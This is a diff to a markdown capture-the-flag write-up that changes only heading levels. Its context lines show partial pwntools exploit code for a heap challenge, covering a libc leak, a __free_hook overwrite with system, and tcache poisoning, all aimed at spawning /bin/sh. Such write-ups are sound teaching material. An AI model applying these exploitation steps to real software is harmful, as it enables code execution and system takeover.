@@ -195,7 +195,7 @@ if __name__ == "__main__":
 
  **NB : I PATCHED THE BINARY USING PWNINIT**
 
-### First Step We Leak Libc
+#### First Step We Leak Libc
 
 ```python
     alloc(5,1)#0 1 2 3 4 # We Allocate 5 chunks of large size so when freed it will contain fd and bk pointers which are main_arena addressess.
@@ -209,13 +209,13 @@ if __name__ == "__main__":
     log.success('LIBC BASE => ' + hex(base))
     pause()
 ```
-### Second Step We do some Calculation To Pop A Shell
+#### Second Step We do some Calculation To Pop A Shell
 ```python
     system = base + libc.sym['system'] # Target to execute is system("/bin/sh");
     free_hook = base + libc.sym['__free_hook'] # we are going to overwrite free hook with system address
 ```
 
-### Final Step Create Overlapping Chunks To Perfom Tcache Poisining
+#### Final Step Create Overlapping Chunks To Perfom Tcache Poisining
 ```python
     alloc(4,2)
     free()
